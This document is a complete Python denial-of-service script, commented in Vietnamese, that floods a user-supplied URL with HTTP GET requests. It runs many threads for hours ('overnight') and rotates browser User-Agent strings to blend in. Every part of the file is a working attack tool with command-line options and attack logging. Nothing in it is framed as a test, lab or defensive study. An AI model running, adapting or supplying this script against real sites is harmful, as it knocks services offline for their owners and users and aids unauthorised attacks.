import socket
import random
import threading
import time
import sys
import ssl
import urllib.parse
import os
import logging

# ========== CẤU HÌNH QUA ĐÊM ==========
TARGET_URL = "http://target.com"
THREADS = 80                # Đủ mạnh nhưng không gây quá tải CPU
DURATION = 28800            # 8 tiếng (tính bằng giây)
METHOD = "GET"              # Nhẹ hơn POST
SLEEP_INTERVAL = 0.002      # Nghỉ ngắn giữa mỗi request để giảm CPU
LOG_FILE = "ddos_night.log" # Ghi log để biết tình trạng
# =====================================

logging.basicConfig(filename=LOG_FILE, level=logging.INFO, format='%(asctime)s - %(message)s')

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
]

def parse_target():
    parsed = urllib.parse.urlparse(TARGET_URL)
    host = parsed.netloc
    path = parsed.path if parsed.path else "/"
    if parsed.query:
        path += "?" + parsed.query
    scheme = parsed.scheme
    port = 443 if scheme == "https" else 80
    return host, path, scheme, port

def http_flood(thread_id):
    host, path, scheme, port = parse_target()
    is_https = scheme == "https"
    end = time.time() + DURATION
    sent = 0
    while time.time() < end:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            if is_https:
                context = ssl.create_default_context()
                sock = context.wrap_socket(sock, server_hostname=host)
            sock.connect((host, port))
            ua = random.choice(USER_AGENTS)
            req = f"GET {path} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: {ua}\r\nConnection: close\r\n\r\n"
            sock.send(req.encode())
            try:
                sock.recv(4096)
            except:
                pass
            sock.close()
            sent += 1
            time.sleep(SLEEP_INTERVAL)
        except:
            pass
    logging.info(f"Thread {thread_id} sent {sent} requests")
    print(f"Thread {thread_id} sent {sent}")

def main():
    global TARGET_URL, THREADS, DURATION
    if len(sys.argv) < 2:
        print("Usage: python ddos_night.py <URL> [threads] [duration_seconds]")
        print("Example: python ddos_night.py http://target.com 80 28800")
        sys.exit(1)
    TARGET_URL = sys.argv[1]
    if len(sys.argv) > 2:
        THREADS = int(sys.argv[2])
    if len(sys.argv) > 3:
        DURATION = int(sys.argv[3])

    logging.info(f"START ATTACK on {TARGET_URL} with {THREADS} threads for {DURATION}s")
    print(f"[+] Mục tiêu: {TARGET_URL}")
    print(f"[+] Số luồng: {THREADS}, Thời gian: {DURATION}s")
    print(f"[+] Log file: {LOG_FILE}")
    print("[+] Bắt đầu tấn công qua đêm... (Ctrl+C để dừng)")

    threads = []
    for i in range(THREADS):
        t = threading.Thread(target=http_flood, args=(i,))
        t.start()
        threads.append(t)
        time.sleep(0.02)  # Giãn cách tạo thread

    try:
        for t in threads:
            t.join()
    except KeyboardInterrupt:
        logging.info("STOPPED by user")
        print("\n[!] Dừng bởi người dùng.")
        sys.exit(0)
    logging.info("ATTACK FINISHED")
    print("[+] Kết thúc tấn công.")

if __name__ == "__main__":
    main()
